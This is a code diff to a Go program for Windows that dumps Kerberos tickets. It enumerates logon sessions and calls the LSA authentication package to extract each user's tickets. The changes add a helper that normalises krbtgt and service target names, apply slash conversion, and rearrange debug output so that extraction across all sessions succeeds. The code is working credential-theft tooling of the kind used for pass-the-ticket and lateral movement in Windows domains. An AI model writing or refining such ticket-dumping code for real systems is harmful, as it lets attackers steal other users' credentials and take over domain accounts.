@@ -358,6 +358,21 @@ func lsaStrToString(s LsaString) string {
 	return windows.UTF16ToString(buf)
 }
 
+func normalizeTargetName(targetName string) string {
+	// Convert forward slashes to backslashes
+	name := strings.ReplaceAll(targetName, "/", "\\")
+
+	// If it's a krbtgt ticket, ensure proper format
+	if strings.HasPrefix(strings.ToLower(name), "krbtgt\\") {
+		parts := strings.Split(name, "\\")
+		if len(parts) >= 2 {
+			return fmt.Sprintf("krbtgt\\%s", strings.ToUpper(parts[1]))
+		}
+	}
+
+	return name
+}
+
 func enumerateLogonSessions() ([]windows.LUID, error) {
 	fmt.Printf("[*] Enumerating logon sessions\n")
 	var count uint32
@@ -493,6 +508,8 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	// Check if running with admin privileges
 	isAdmin, _ := isAdmin()
 
+	targetName = strings.ReplaceAll(targetName, "/", "\\")
+
 	// Convert target name to UTF16 and calculate sizes
 	targetNameUTF16 := windows.StringToUTF16(targetName)
 	nameLen := uint16(len(targetNameUTF16) * 2) // Length in bytes
@@ -534,11 +551,12 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		Buffer:        targetNamePtr,
 	}
 
+	fmt.Printf("[*] Attempting to extract ticket for %s (Admin: %v)\n", targetName, isAdmin)
+	fmt.Printf("[*] Target name length: %d bytes\n", nameLen)
+
 	var responsePtr uintptr
 	var returnLength uint32
 	var protocolStatus uint32
-
-	fmt.Printf("[*] Attempting to extract ticket for %s (Admin: %v)\n", targetName, isAdmin)
 
 	ret, _, _ := LsaCallAuthenticationPackage.Call(
 		uintptr(lsaHandle),
@@ -890,7 +908,8 @@ func GetKerberosTickets() []map[string]interface{} {
 	for _, cred := range sessionCreds {
 		fmt.Printf("[*] Processing tickets for %s\\%s\n", cred.LogonSession.LogonDomain, cred.LogonSession.Username)
 		for _, ticket := range cred.Tickets {
-			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
+			normalizedTarget := normalizeTargetName(ticket.ServerName)
+			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, normalizedTarget)
 			if err != nil {
 				fmt.Printf("[-] Failed to extract ticket for %s: %v\n", ticket.ServerName, err)
 				continue
